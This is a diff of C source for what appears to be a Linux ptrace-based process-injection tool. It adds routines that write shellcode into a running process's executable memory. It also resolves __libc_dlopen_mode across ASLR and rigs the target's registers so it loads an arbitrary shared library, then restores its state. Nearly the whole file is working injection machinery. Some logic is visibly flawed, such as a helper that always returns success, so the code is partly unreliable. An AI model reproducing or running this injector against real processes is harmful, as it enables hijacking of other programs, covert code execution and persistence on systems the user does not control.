@@ -5,24 +5,70 @@
 #include <sys/wait.h>
 #include <sys/user.h>
 #include <unistd.h>
+#include <signal.h>
 
 #include "inject.h"
 #include "ptrace_utils.h"
 
-#define IF_FAILURE_THEN_DONE(res) do { if(0 != res) goto done; } while(0)
+#define IF_NONZERO_THEN_DONE(res) do { if(0 != res) goto done; } while(0)
+#define IF_ZERO_THEN_DONE(res) do { if(0 == res) goto done; } while(0)
+#define IF_NULL_THEN_DONE(res) do { if(NULL == res) goto done; } while(0)
 
+static int copy_and_inject(pid_t pid, unsigned long* addr, void* shellcode, size_t shellcode_len, void* outBuff){
+	int result = EXIT_SUCCESS;
+
+	if(NULL == outBuff){
+		// Force caller to manage memory
+		printf("[-] Null out buffer pointer passed. Must be at least size of shellcode_len\n");
+		result = EXIT_FAILURE;
+		goto done;
+	}
+
+	if(0 != *addr){
+		// If no address provided, try to find one
+		*addr = putils_findExecAddr(pid);
+		if(!(*addr)){
+			result = EXIT_FAILURE;
+			goto done;
+		}
+	}
+
+	// Read out a copy of the code occupying executable memory
+	result = ptraceRead(pid, *addr, outBuff, shellcode_len);
+	IF_NONZERO_THEN_DONE(result);
+	
+	// Inject
+	printf("[+] Injecting %lu bytes of shellcode...\n", shellcode_len);
+	result = ptraceWrite(pid, *addr, shellcode, shellcode_len);
+	IF_NONZERO_THEN_DONE(result);
+
+
+
+done:
+	return EXIT_SUCCESS;
+}
+
+/**
+ * @brief Still in PoC state, do not use just yet
+ * 
+ * @param pid 
+ * @param shellcode 
+ * @param shellcode_len 
+ * @param options 
+ * @return int 
+ */
 int inject_shellcode(pid_t pid, void* shellcode, size_t shellcode_len, uint8_t options){
 
-	unsigned char *oldcode = NULL;
+	unsigned char *code_save = NULL;
 	struct user_regs_struct oldregs = {0};
 	struct user_regs_struct regs = {0};
-	long addr = 0;
+	unsigned long addr = 0;
 	int target_status = 0;
 	int attach_status = DETACHED;
 	int result = EXIT_SUCCESS;
 
 	// Find a good address to copy code to
-	addr = findExecAddr(pid);
+	addr = putils_findExecAddr(pid);
 	if(!addr){
 		result = EXIT_FAILURE;
 		goto done;
@@ -30,40 +76,34 @@ int inject_shellcode(pid_t pid, void* shellcode, size_t shellcode_len, uint8_t o
 
 	// Attach to the target process
 	result = ptraceAttach(pid, &target_status);
-	IF_FAILURE_THEN_DONE(result);
+	IF_NONZERO_THEN_DONE(result);
 
 	attach_status = ATTACHED;
 
 	// Store the current register values for later
 	result = ptraceGetRegs(pid, &oldregs);
-	IF_FAILURE_THEN_DONE(result);
+	IF_NONZERO_THEN_DONE(result);
 	memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));
 
 	// Allocate memory for code we carve out
-	oldcode = malloc(shellcode_len * sizeof(uint8_t));
+	code_save = malloc(shellcode_len * sizeof(uint8_t));
 
-	// Read out a copy of the code occupying executable memory
-	result = ptraceRead(pid, addr, oldcode, shellcode_len);
-	IF_FAILURE_THEN_DONE(result);
-	
-	// Inject
-	printf("[+] Injecting %lu bytes of shellcode...\n", shellcode_len);
-	result = ptraceWrite(pid, addr, shellcode, shellcode_len);
-	IF_FAILURE_THEN_DONE(result);
+	result = copy_and_inject(pid, &addr, shellcode, shellcode_len, code_save);
+	IF_NONZERO_THEN_DONE(result);
 	
 	regs.rip = addr + 2;
 	ptraceSetRegs(pid, &regs);
-	IF_FAILURE_THEN_DONE(result);
+	IF_NONZERO_THEN_DONE(result);
 
 	result = ptraceCont(pid, 0, (int*)0);
-	IF_FAILURE_THEN_DONE(result);
+	IF_NONZERO_THEN_DONE(result);
 
 	result = ptraceDetach(pid);
 	attach_status = DETACHED;	
 
 done:
-	if(NULL != oldcode){
-		free(oldcode);
+	if(NULL != code_save){
+		free(code_save);
 	}
 	if(ATTACHED == attach_status){
 		ptraceDetach(pid);
@@ -71,43 +111,210 @@ done:
 	return result;
 }
 
+/**
+ * @brief Using our own process. Calulate the offset from the start
+ * of libdl in memory to the function entry for dlopen.
+ * 
+ * @param out_offset 
+ * @return int 
+ */
+static int get_dlopenOffset(unsigned long* out_offset){
+	int result = EXIT_FAILURE;
+    void* self_dlopen_addr = NULL;
+    void* self_libdl_addr = NULL;
+	
+	// Clear out variable
+	*out_offset = 0;
+	
+	// Open up the library so we can search for symbols
+	self_libdl_addr = dlopen("libc.so.6", RTLD_LAZY);
+	IF_NULL_THEN_DONE(self_libdl_addr);
 
+	printf("[*] libc.so loaded at address %p\n", self_libdl_addr);
 
-/*
-    unsigned long long target_libdl_exemem, self_libdl_exemem;
-    void *dlopen_sym_addr = NULL;
-    void *self_libdl_addr = NULL;
+	// Now get the address of __libc_dlopen_mode
+	self_dlopen_addr = dlsym(self_libdl_addr, "__libc_dlopen_mode");
+	IF_NULL_THEN_DONE(self_dlopen_addr);
 
-	self_libdl_addr = dlopen("libdl.so", RTLD_LAZY);
-	if (self_libdl_addr == NULL) {
+	printf("[*] dlopen() found at address %p\n", self_dlopen_addr);
+
+	/*
+	 * Through experimenting, looks like when libdl.so is opened
+	 * it is opened at a slight offset, since this can't be guaranteed to be
+	 * the same we need to get the actual beginning of libdl.so 
+	 */
+	self_libdl_addr = (void*)putils_findLibrary("libc", -1);
+
+done:
+	if(NULL == self_libdl_addr){
 		printf("[!] Error opening libdl.so\n");
-		exit(EXIT_FAILURE);
 	}
-	printf("[*] libdl.so loaded at address %p\n", self_libdl_addr);
-
-	dlopen_sym_addr = dlsym(self_libdl_addr, "dlopen");
-	if (dlopen_sym_addr == NULL) {
+	else if(NULL == self_dlopen_addr){
 		printf("[!] Error locating dlopen() function\n");
-		exit(EXIT_FAILURE);
 	}
-	printf("[*] dlopen() found at address %p\n", dlopen_sym_addr);
+	else{
+		/*
+		 * Due to ASLR, we need to calculate the 
+		 * address offset from the base of libdl and 
+		 * the address of __libc_dlopen_mode
+		 */
+		*out_offset = (self_dlopen_addr - self_libdl_addr);
+		result = EXIT_SUCCESS;
+	}
+	return result;
+}
+
+static
+int find_target_dlopen(pid_t target_pid, unsigned long* target_dlopen_addr){
+	
+	int result = EXIT_FAILURE;
+    unsigned long offset = 0;
+	unsigned long target_libdl_addr = 0;
 
 	// Find the base address of libdl in our target process
-	target_libdl_exemem = findLibrary("libdl", atoi(argv[1]));
-	if(!target_libdl_exemem){
-		printf("[-] Could not locate libdl in PID: %i", atoi(argv[1]));
-		exit(EXIT_FAILURE);
+	target_libdl_addr = putils_findLibrary("libc", target_pid);
+	IF_ZERO_THEN_DONE(target_libdl_addr);
+	printf("[*] libc located in PID %d at address %lx\n", target_pid, target_libdl_addr);
+
+	// Calculate the actual offset
+	result = get_dlopenOffset(&offset);
+	IF_NONZERO_THEN_DONE(result);
+	
+	// Use offset to figure out where function is in target memory
+	*target_dlopen_addr = target_libdl_addr + offset;
+	printf("[*] dlopen() offset in libc found to be 0x%llx (%llu) bytes\n", (unsigned long long)(offset),(unsigned long long)(offset));
+	printf("[*] dlopen() in target process at address 0x%lx\n", *target_dlopen_addr);
+	
+done:
+	return result;
+}
+
+int inject_so(pid_t pid, void* shellcode, size_t shellcode_len, char* soPath, size_t soPath_len, uint8_t options){
+
+	
+	struct user_regs_struct oldregs = {0};
+	struct user_regs_struct regs = {0};
+	unsigned char nopsled[] =  "\x90\x90\x90\x90\x90\x90";
+	unsigned long addr = 0;
+	unsigned long target_dlopen_addr = 0	;
+	unsigned char *code_save = NULL;
+	size_t toSaveSize = (soPath_len + sizeof(nopsled)+1 + shellcode_len);
+	int target_status = 0;
+	int attach_status = DETACHED;
+	int result = EXIT_SUCCESS;
+
+
+	// Figure out where dlopen() in the target process is
+	result = find_target_dlopen(pid, &target_dlopen_addr);
+	IF_NONZERO_THEN_DONE(result);
+
+	printf("target_dlopen_addr: %llx", (unsigned long long)target_dlopen_addr);
+
+	// Attach to the target process
+	result = ptraceAttach(pid, &target_status);
+	IF_NONZERO_THEN_DONE(result);
+	attach_status = ATTACHED;
+
+	// Store the current register values for later
+	result = ptraceGetRegs(pid, &oldregs);
+	IF_NONZERO_THEN_DONE(result);
+	memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));
+
+	// Allocate memory for code we carve out
+	code_save = malloc(toSaveSize * sizeof(uint8_t));
+
+	// Find a good address to inject
+	addr = putils_findExecAddr(pid);
+	if(!addr){
+		result = EXIT_FAILURE;
+		goto done;
 	}
-	printf("[*] libdl located in PID %d at address %p\n", atoi(argv[1]), (void*)target_libdl_exemem);
 
-	// Find base of executable lib memory
-	self_libdl_exemem = findLibrary("libdl", -1);
+	// Read out a copy of the code occupying executable memory
+	result = ptraceRead(pid, addr, code_save, toSaveSize);
+	IF_NONZERO_THEN_DONE(result);
 
-	 * Due to ASLR, we need to calculate the 
-	 * address offset in the target process
-	 
-	dlopen_sym_addr = target_libdl_exemem + (dlopen_sym_addr - self_libdl_exemem);
-	printf("[*] dlopen() offset in libdl found to be 0x%llx bytes\n", (unsigned long long)(self_libdl_addr - self_libdl_exemem));
-	printf("[*] dlopen() in target process at address 0x%llx\n", (unsigned long long)dlopen_sym_addr);
+	// Inject library path to memory
+	result = ptraceWrite(pid, addr, soPath, soPath_len); // 48
+	IF_NONZERO_THEN_DONE(result);
 
-*/
+	// Inject nopsled 
+	result = ptraceWrite(pid, (addr+soPath_len), "\x90\x90\x90\x90\x90\x90\x90", 8);
+	IF_NONZERO_THEN_DONE(result);
+
+	// Inject shellcode
+	result = ptraceWrite(pid, (addr+soPath_len+8), shellcode, shellcode_len);
+	IF_NONZERO_THEN_DONE(result);
+
+	// Set RIP to shellcode
+	regs.rip = (unsigned long long)addr+soPath_len+8+2;
+	// Set RDI to injected library path
+	regs.rdi = (unsigned long long)addr;
+	// Set RSI to 1 RTLD_LAZY
+	regs.rsi = 1;
+	// Update RAX to point to dlopen()
+	regs.rax = (unsigned long long)target_dlopen_addr;
+	printf("REGS: rax = %llx, rdi = %llx, rsi = %llx, rip = %llx\n",regs.rax, regs.rdi, regs.rsi, regs.rip);
+	ptraceSetRegs(pid, &regs);
+	IF_NONZERO_THEN_DONE(result);
+
+	// Run
+	result = ptraceCont(pid, 0, (int*)0);
+	IF_NONZERO_THEN_DONE(result);
+
+	// Catch expected trap call
+	waitpid(pid, &target_status, WUNTRACED);
+	if (WIFSTOPPED(target_status) && WSTOPSIG(target_status) == SIGTRAP) {
+		printf("[+] Target trap successfully caught\n");
+
+		// Grab regs
+		result = ptraceGetRegs(pid, &regs);
+		IF_NONZERO_THEN_DONE(result);
+
+		printf("REGS: rax = %llx, rdi = %llx, rsi = %llx, rip = %llx\n",regs.rax, regs.rdi, regs.rsi, regs.rip);
+
+		// DEBUG
+		//sleep(10);
+
+		if(0 == regs.rax){
+			printf("[+] %s was successfully loaded into %d\n", soPath, pid);
+		}
+		else{
+			printf("[-] %s failed to loaded into %d target rax == %llu\n", soPath, pid, regs.rax);
+		}
+
+		/*
+		 * Here we need to restore the target
+		 * back to its original state
+		 */
+		// Write back old instructions
+		printf("[+] Writing back original instructions...\n");
+		result = ptraceWrite(pid, addr, code_save, toSaveSize);
+		IF_NONZERO_THEN_DONE(result);
+		
+		// Set registers to original state
+		printf("[+] Setting registers to original state...\n");
+		result = ptraceSetRegs(pid, &oldregs);
+		IF_NONZERO_THEN_DONE(result);
+
+		printf("[+] Resuming target process execution...\n");
+		result = ptraceCont(pid, 0, (int*)0);
+		IF_NONZERO_THEN_DONE(result);
+
+		result = ptraceDetach(pid);
+		attach_status = DETACHED;	
+	}
+	else{
+		printf("oh boy...\n");
+	}
+	// done
+
+done:
+	if(NULL != code_save){
+		free(code_save);
+	}
+	if(ATTACHED == attach_status){
+		ptraceDetach(pid);
+	}
+	return result;
+}
